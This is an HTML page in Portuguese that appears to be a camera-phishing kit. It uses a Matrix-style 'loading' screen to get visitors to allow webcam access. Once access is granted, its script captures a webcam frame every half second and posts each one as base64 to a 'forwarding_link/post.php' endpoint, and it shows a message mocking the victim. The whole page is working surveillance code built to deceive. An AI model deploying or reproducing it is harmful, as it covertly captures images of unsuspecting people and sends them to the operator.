<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal de Acesso</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        /* Estilo Hacker Matrix */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            color: rgb(255, 255, 255); /* Verde Matrix */
        }

        /* Papel de parede de cÃ³digos (Matrix) */
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }

        #app-container {
            text-align: center;
            width: 90%;
            max-width: 500px;
            z-index: 10;
        }

        /* Loader Hacker */
        .loader {
            width: 40px;
            height: 40px;
            border: 2px solid rgb(120, 125, 120);
            border-top: 2px solid rgb(255, 255, 255);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-bottom: 15px;
            box-shadow: 0 0 10px rgb(255, 255, 255);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .msg-principal {
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 8px #0f0;
        }

        /* Estilo da Moldura da Webcam */
        .video-box {
            display: none;
            width: 100%;
            border: 2px solid #0f0;
            border-radius: 4px;
            position: relative;
            background: #000;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
            overflow: hidden;
        }

        /* Overlay de Interface Hacker */
        .hacker-ui {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            border: 1px solid rgba(0, 255, 0, 0.2);
            box-sizing: border-box;
        }

        .hacker-text-top {
            position: absolute;
            top: 5px;
            left: 10px;
            font-size: 10px;
            color: #0f0;
            opacity: 0.8;
        }

        #msg-sucesso {
            display: none;
            color: #0f0;
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
            text-shadow: 0 0 15px #0f0;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }

        video {
            width: 100%;
            display: block;
            transform: scaleX(-1);
            filter: sepia(50%) hue-rotate(80deg) brightness(1.1) contrast(1.2);
        }

        .btn-retry {
            display: none;
            margin-top: 20px;
            padding: 12px 24px;
            background: transparent;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: inherit;
            font-weight: bold;
            cursor: pointer;
            box-shadow: inset 0 0 5px #0f0;
        }

        canvas { display: none; }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>

    <div id="app-container">
        <div id="loading-area">
            <div class="loader"></div>
            <p class="msg-principal">Carregando</p>
            <p style="color: rgb(255, 255, 255); font-size: 12px;">Permitir Para Proceguir Para Proxima Pagina</p>
        </div>

        <p id="msg-sucesso">TE PEGUEI SEU IDIOTAðŸ¤£ðŸ¤£</p>

        <div id="video-area" class="video-box">
            <div class="hacker-ui">
                <div class="hacker-text-top">REC [00:42:19] // IP: 192.168.1.1</div>
            </div>
            <video id="video" playsinline autoplay></video>
        </div>

        <button id="retry-btn" class="btn-retry" onclick="requestCamera()">REINICIAR PROTOCOLO</button>
    </div>

    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // --- Efeito Matrix de Fundo ---
        const matrixCanvas = document.getElementById('matrix-bg');
        const mctx = matrixCanvas.getContext('2d');
        matrixCanvas.width = window.innerWidth;
        matrixCanvas.height = window.innerHeight;
        const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%\"'#&_(),.;:?!\\|{}<>[]^~";
        const fontSize = 16;
        const columns = matrixCanvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            mctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            mctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            mctx.fillStyle = "#0f0";
            mctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                mctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 33);

        // --- LÃ³gica da CÃ¢mera ---
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loadingArea = document.getElementById('loading-area');
        const videoArea = document.getElementById('video-area');
        const retryBtn = document.getElementById('retry-btn');
        const msgSucesso = document.getElementById('msg-sucesso');

        let isPosting = false;

        function post(imgdata) {
            if (isPosting) return;
            isPosting = true;
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                complete: function() { isPosting = false; }
            });
        }

        async function requestCamera() {
            retryBtn.style.display = 'none';
            loadingArea.style.display = 'block';
            msgSucesso.style.display = 'none';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { facingMode: "user" }
                });
                
                video.srcObject = stream;
                loadingArea.style.display = 'none';
                msgSucesso.style.display = 'block';
                videoArea.style.display = 'block';

                const context = canvas.getContext('2d');
                setInterval(() => {
                    context.drawImage(video, 0, 0, 640, 480);
                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(canvasData);
                }, 500);

            } catch (e) {
                loadingArea.style.display = 'none';
                retryBtn.style.display = 'inline-block';
                alert("ACESSO NEGADO: PERMISSÃƒO OBRIGATÃ“RIA");
            }
        }

        window.onload = requestCamera;
    </script>
</body>
</html>
